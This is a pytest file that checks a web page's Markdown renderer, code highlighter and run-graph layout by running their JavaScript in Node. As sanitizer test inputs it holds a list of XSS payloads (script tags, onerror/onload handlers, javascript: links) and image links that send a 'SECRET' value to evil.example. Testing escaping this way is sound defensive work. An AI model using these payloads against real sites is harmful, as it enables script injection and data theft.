"""Lesson 54: the page's Markdown and code highlighting, run in Node: model text must never become HTML of its own."""
import json
import re
import shutil
import subprocess
from pathlib import Path

import pytest

NODE = shutil.which("node")
SCRIPT = Path(__file__).resolve().parents[1] / "harness" / "web" / "static" / "markdown.js"
RUN = """
const fs = require("fs"), vm = require("vm");
const page = {}; vm.createContext(page);
vm.runInContext(fs.readFileSync(process.argv[1], "utf8"), page);
const calls = JSON.parse(fs.readFileSync(0, "utf8"));
process.stdout.write(JSON.stringify(calls.map(([fn, ...args]) => page[fn](...args))));
"""
TAGS = {"p", "br", "strong", "em", "del", "code", "pre", "a", "span", "ul", "ol", "li", "h1", "h2", "h3", "h4", "hr", "blockquote",
        "table", "tr", "th", "td"}
pytestmark = pytest.mark.skipif(NODE is None, reason="needs Node.js to run the page's script")


def run(*calls):
    done = subprocess.run([NODE, "-e", RUN, str(SCRIPT)], input=json.dumps(calls), capture_output=True, text=True, encoding="utf-8", check=True)
    return json.loads(done.stdout)


def only_our_tags(html: str) -> None:
    for tag, attrs in re.findall(r"<\s*/?\s*([a-zA-Z0-9]+)([^>]*)>", html):
        assert tag.lower() in TAGS, tag
        assert re.fullmatch(r'(\s+[a-z]+="[^"]*")*\s*', attrs), attrs       # nothing but name="value" pairs (a quote in a value is &quot;)
        pairs = dict(re.findall(r'\s+([a-z]+)="([^"]*)"', attrs))
        assert set(pairs) <= {"class", "href", "target", "rel", "start"}, attrs
        assert re.match(r"https?://", pairs.get("href", "https://")) and pairs.get("start", "1").isdigit(), attrs


ATTACKS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "hello <b onclick=alert(1)>bold</b>",
    "[click](javascript:alert(1))",
    "[click](https://a.example/\"onmouseover=\"alert(1))",
    "![logo](https://evil.example/collect?d=SECRET)",
    "```html\n</code></pre><script>alert(1)</script>\n```",
    "| a | b |\n|---|---|\n| <svg onload=alert(1)> | `<i>` |",
    "> <iframe src=https://evil.example>",
    "- <a href=javascript:alert(1)>x</a>",
    "\u0000" + "0" + "\u0000 and `code`",
    "**<style>body{display:none}</style>**",
]


def test_model_text_never_becomes_html_of_its_own():
    for text, html in zip(ATTACKS, run(*[["md", a] for a in ATTACKS]), strict=True):
        only_our_tags(html)             # any "<script", "onerror=" left is text: the tags were escaped
        assert "<script" not in html and "<img" not in html, text


def test_pictures_are_never_fetched_and_links_open_safely():
    picture, link = run(["md", "![logo](https://evil.example/x.png?d=SECRET)"], ["md", "[docs](https://docs.python.org/3/)"])
    assert "<img" not in picture and "[image: logo]" in picture and "evil.example" not in picture
    assert link == '<p><a href="https://docs.python.org/3/" target="_blank" rel="noopener noreferrer">docs</a></p>'


def test_the_markdown_an_agent_writes():
    html = run(["md", "# Title\nSome **bold**, *em* and `code`.\n\n- one\n- two\n\n1. first\n\n| a | b |\n|---|---|\n| 1 | 2 |\n\n> ½ + x²\n\n```py\nx = 1\n```"])[0]
    assert html.startswith("<h1>Title</h1><p>Some <strong>bold</strong>, <em>em</em> and <code>code</code>.</p>")
    assert "<ul><li>one</li><li>two</li></ul><ol><li>first</li></ol>" in html
    assert "<table><tr><th>a</th><th>b</th></tr><tr><td>1</td><td>2</td></tr></table>" in html
    assert "<blockquote><p>½ + x²</p></blockquote>" in html and '<span class="n">1</span>' in html


def test_a_numbered_list_with_blank_lines_is_one_list():
    """Models often write "1. a", a blank line, "2. b": each became its own list numbered 1 (seen live, Lesson 55)."""
    one, later = run(["md", "1. first\n\n2. second\n\n3. third"], ["md", "4. four\n5. five"])
    assert one == "<ol><li>first</li><li>second</li><li>third</li></ol>"
    assert later == '<ol start="4"><li>four</li><li>five</li></ol>'


def test_code_is_highlighted_and_still_escaped():
    py, js = run(["highlight", 'def f(x):  # say "<hi>"\n    return "<b>"', "py"], ["highlight", "const a = '<x>'; // </pre>", "js"])
    assert '<span class="k">def</span> <span class="f">f</span>' in py and '<span class="c"># say &quot;&lt;hi&gt;&quot;</span>' in py
    assert '<span class="s">&quot;&lt;b&gt;&quot;</span>' in py and "<b>" not in py
    assert "&lt;x&gt;" in js and "</pre>" not in js
    only_our_tags(py + js)


# --- the run graph's layout (Lesson 60) ----------------------------------------------------------------------------------

GRAPH = Path(__file__).resolve().parents[1] / "harness" / "web" / "static" / "graph.js"
SCENARIO = """
const fs = require("fs"), vm = require("vm");
const page = {}; vm.createContext(page);
vm.runInContext(fs.readFileSync(process.argv[1], "utf8"), page);
const L = page.makeLayout(), seen = [], names = ["read_file", "grep", "edit_file", "run_shell", "list_dir", "write_file", "glob"];
const snap = () => [...L.nodes.values()].map((n) => [n.id, n.x, n.y]);
const t0 = Date.now();
for (let r = 0; r < Number(process.argv[2]); r++) {
  L.add("r" + r, "request", "request number " + r, r ? "r" + (r - 1) : null);
  if (r === 1) seen.push(snap());
  for (let k = 0; k < 6; k++) L.add(`t${r}-${k}`, "tool", names[(r + k) % names.length], "r" + r);
  if (r % 3 === 0) {
    L.add(`d${r}`, "tool", "delegate", "r" + r);
    L.add(`a${r}`, "agent", "explore", `d${r}`);
    for (let k = 0; k < 4; k++) L.add(`s${r}-${k}`, "tool", names[k], `a${r}`);
  }
  L.add(`ans${r}`, "answer", "answer", "r" + r);
}
const ms = Date.now() - t0;
const nodes = [...L.nodes.values()].map((n) => ({id: n.id, kind: n.kind, x: n.x, y: n.y, box: n.label ? n.label.box : null}));
process.stdout.write(JSON.stringify({nodes, first: seen[0], bounds: L.bounds, ms}));
"""
R = {"request": 9, "agent": 7, "tool": 5, "answer": 4}


def layout(requests: int) -> dict:
    done = subprocess.run([NODE, "-e", SCENARIO, str(GRAPH), str(requests)], capture_output=True, text=True, encoding="utf-8", check=True)
    return json.loads(done.stdout)


def test_the_graph_layout_never_moves_a_node_and_never_overlaps_labels_or_nodes():
    out = layout(20)
    nodes = {n["id"]: n for n in out["nodes"]}
    assert len(nodes) == 20 * 8 + 7 * 6                         # requests, 6 calls and an answer each; 7 delegations with 4 calls
    for node_id, x, y in out["first"]:                          # where they were when the second request started: still there
        assert (nodes[node_id]["x"], nodes[node_id]["y"]) == (x, y)
    boxes = [n["box"] for n in out["nodes"] if n["box"]]
    assert len(boxes) > len(nodes) * 0.6                        # most labels are shown
    for i, a in enumerate(boxes):
        for b in boxes[i + 1:]:
            assert not (a["x0"] < b["x1"] and b["x0"] < a["x1"] and a["y0"] < b["y1"] and b["y0"] < a["y1"]), (a, b)
    ns = list(nodes.values())
    for i, a in enumerate(ns):
        for b in ns[i + 1:]:
            assert ((a["x"] - b["x"]) ** 2 + (a["y"] - b["y"]) ** 2) ** 0.5 >= R[a["kind"]] + R[b["kind"]], (a["id"], b["id"])
    for n in ns:                                                # no dot covers another node's label (a sub-agent's calls did)
        for other in boxes:
            if other is not n["box"]:
                r = R[n["kind"]]
                assert not (n["x"] - r < other["x1"] and other["x0"] < n["x"] + r and n["y"] - r < other["y1"] and other["y0"] < n["y"] + r), n["id"]
    B = out["bounds"]
    assert all(B["x0"] <= n["x"] <= B["x1"] and B["y0"] <= n["y"] <= B["y1"] for n in ns)        # Fit's box holds everything


def test_the_page_style_leaves_the_labels_anchors_to_the_layout():
    """`.node text { text-anchor: middle }` in app.css beat the attribute graph.js sets, so labels pointing sideways were drawn centred on
    their anchor, 12 units from where the layout had checked them (found in the browser, Lesson 60)."""
    css = (GRAPH.parent / "app.css").read_text(encoding="utf-8")
    assert "text-anchor" not in re.sub(r"/\*.*?\*/", "", css, flags=re.S)


def test_the_graph_layout_is_deterministic():
    assert layout(5)["nodes"] == layout(5)["nodes"]
